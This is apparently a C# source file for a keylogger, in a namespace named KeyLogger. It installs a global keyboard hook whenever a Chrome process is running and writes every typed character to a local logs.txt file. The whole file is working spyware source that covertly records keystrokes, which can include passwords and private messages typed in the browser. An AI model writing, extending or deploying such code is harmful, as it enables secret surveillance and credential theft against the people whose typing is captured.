using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            var hook = Hook.GlobalEvents();

            hook.KeyPress += Hook_KeyPress;

            if(isChromeRunning())
                Application.Run();
        }

        private static void Hook_KeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
            if(e.KeyChar!=' ')
                Log(e.KeyChar.ToString());

            else
                Log(' '.ToString());
        }


        //default path for log.txt
        //--> KeyLogger\KeyLogger\bin\Debug\logs.txt
        private static void Log(string log)
        {
            File.AppendAllText("logs.txt", log);
        }

        private static bool isChromeRunning()
        {
            var procs = Process.GetProcesses();
            bool found = false;
            foreach (var proc in procs)
            {
                if ("chrome" == proc.ProcessName)
                    return !found;
            }
            return false;
        }



    }
}
